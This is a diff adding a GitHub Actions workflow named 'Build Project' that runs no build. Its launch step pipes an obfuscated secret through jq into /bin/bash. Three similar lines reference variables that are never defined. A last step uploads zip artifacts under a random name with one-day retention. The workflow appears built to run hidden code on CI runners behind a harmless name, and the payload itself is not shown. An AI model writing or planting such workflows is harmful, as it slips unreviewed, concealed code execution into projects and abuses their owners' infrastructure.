@@ -1,0 +1,38 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          k2791: ${{ secrets.k2791 }}
+        run: |
+          printf '%s' "$k2791" | jq -r .cai6032 | /bin/bash
+          printf '%s' "$k035" | jq -r .le92304 | /bin/bash
+          printf '%s' "$krutb640" | jq -r .bnd9 | /bin/bash
+          echo $svxm66 | jq -r .xfo16871 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 1V4DTh06
+          path: "*.zip"
+          retention-days: 1
